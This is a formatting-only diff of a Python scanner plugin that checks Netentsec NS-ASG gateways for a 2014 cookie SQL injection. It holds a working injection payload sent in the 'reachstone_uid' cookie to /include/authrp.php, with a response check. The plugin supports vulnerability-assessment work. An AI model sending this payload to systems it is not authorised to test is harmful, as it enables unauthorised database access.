@@ -2,13 +2,15 @@
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import re, urlparse
+import re
+import urlparse
+
 
 class Vuln(ABVuln):
     vuln_id = 'Netentsec_0021'  # 平台漏洞编号，留空
     name = '网康NS-ASG SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-04-30'  # 漏洞公布时间
     desc = '''
         网康 NS-ASG 应用安全网关 cookie注入漏洞：
@@ -20,6 +22,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '网康应用安全网关'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'e2ec1597-9097-42f2-a312-c8a07be141d2'
@@ -34,16 +37,16 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #refer: http://www.wooyun.org/bugs/wooyun-2014-058987
+            # refer: http://www.wooyun.org/bugs/wooyun-2014-058987
             hh = hackhttp.hackhttp()
             arg = self.target
             md5_1 = 'c4ca4238a'
-            #cookie注入
+            # cookie注入
             cookie = 'reachstone_uid=1 and extractvalue(0x1,concat(0x23,md5(1)))'
             url = arg + '/include/authrp.php'
             code, head, res, err, _ = hh.http(url, cookie=cookie)
 
-            if (code==200) and (md5_1 in res):
+            if (code == 200) and (md5_1 in res):
                 #security_hole('SQL Injection: {url} Cookie: {cookie}'.format(url=url,cookie=cookie))
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -53,6 +56,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
